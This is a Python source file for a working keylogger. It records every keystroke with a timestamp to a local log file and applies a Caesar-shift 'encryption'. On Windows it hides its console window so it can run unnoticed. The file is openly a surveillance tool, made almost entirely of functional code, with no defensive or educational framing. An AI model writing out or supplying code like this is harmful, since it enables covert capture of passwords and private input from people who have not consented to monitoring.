import os
from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystrokes.log"  
ENCRYPTION_KEY = 5  

def encrypt(data, key):
    encrypted_data = ""
    for char in data:
        if char.isalpha():
            shift = key % 26
            if char.islower():
                encrypted_data += chr((ord(char) - ord('a') + shift) % 26 + ord('a'))
            else:
                encrypted_data += chr((ord(char) - ord('A') + shift) % 26 + ord('A'))
        else:
            encrypted_data += char
    return encrypted_data

def log_keystroke(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if hasattr(key, "char") and key.char is not None:
            keystroke = key.char
        else:
            keystroke = str(key)
        
        encrypted_keystroke = encrypt(keystroke, ENCRYPTION_KEY)
        
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {encrypted_keystroke}\n")
    
    except Exception as e:
        print(f"Error logging keystroke: {e}")


def on_press(key):
    log_keystroke(key)

def on_release(key):
    if key == keyboard.Key.esc:  
        return False

if os.name == "nt":  
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
else:  
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Escape' to stop.")
    listener.join()